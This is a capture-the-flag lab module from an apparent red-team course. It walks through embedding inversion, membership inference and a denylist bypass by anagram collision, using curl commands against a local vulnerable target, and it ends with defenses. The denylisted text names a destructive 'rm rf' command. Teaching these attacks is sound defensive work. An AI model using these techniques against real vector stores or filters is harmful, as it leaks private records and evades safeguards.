# Module 06 — Attacking Embeddings

> **Target:** `embeddings`. **Maps to:** AI-300 Module 6 · OWASP LLM08, LLM02 ·
> MITRE ATLAS AML.T0024, AML.T0043.

## 1. Idea

Vector stores leak. An embedding retains enough of its source to be **inverted**,
similarity structure enables **membership inference**, and lossy embeddings admit
**collisions** — so "we only store embeddings" is not a privacy or safety control.

This target uses a deliberately transparent character-histogram embedding so you can
*see* why each attack works. A production embedding is heavier and
non-deterministic, but the failure modes are identical. Read
`targets/embeddings/app.py`.

## 2. Start

```bash
redsec up 06
URL=http://127.0.0.1:9060
```

## 3. Walkthrough

### 3.1 `embedding-inversion` (LLM08/LLM02)
Leak the stored vectors, then reconstruct the secret's text via the decode endpoint.

```bash
curl -s $URL/records            # vectors incl. secret-1
# grab secret-1's vector, then:
curl -s $URL/decode -H 'content-type: application/json' \
  -d '{"vector": [ ...secret-1 vector... ]}'      # -> api_key=REDSEC{...}
redsec submit 06 embedding-inversion 'REDSEC{...}'
```

### 3.2 `membership-inference`
Embed a candidate value and search — an exact (distance 0) hit confirms the record
is present.

```bash
V=$(curl -s $URL/embed -H 'content-type: application/json' -d '{"text":"alice@initrode.com"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["vector"])')
curl -s $URL/search -H 'content-type: application/json' -d "{\"vector\": $V}"   # member:true + token
redsec submit 06 membership-inference 'REDSEC{...}'
```

### 3.3 `embedding-collision`
The denylist is checked by *embedding*, and this histogram ignores order — so an
anagram of the banned text collides. Reversing it is the simplest anagram.

```bash
curl -s $URL/protected          # "deny rm rf now"
curl -s $URL/collide -H 'content-type: application/json' -d '{"text":"won fr mr yned"}'   # collision + flag
redsec submit 06 embedding-collision 'REDSEC{...}'
redsec down 06
```

## 4. Defenses

- Treat embeddings as sensitive as their source: encrypt at rest, access-control the
  store, never expose raw vectors or a decode/similarity endpoint publicly.
- Defend membership inference: add noise, limit precision, rate-limit and authorize
  similarity queries, avoid returning exact-match confirmations.
- Use collision-resistant representations where embeddings gate security decisions;
  don't make allow/deny decisions on a lossy embedding alone.
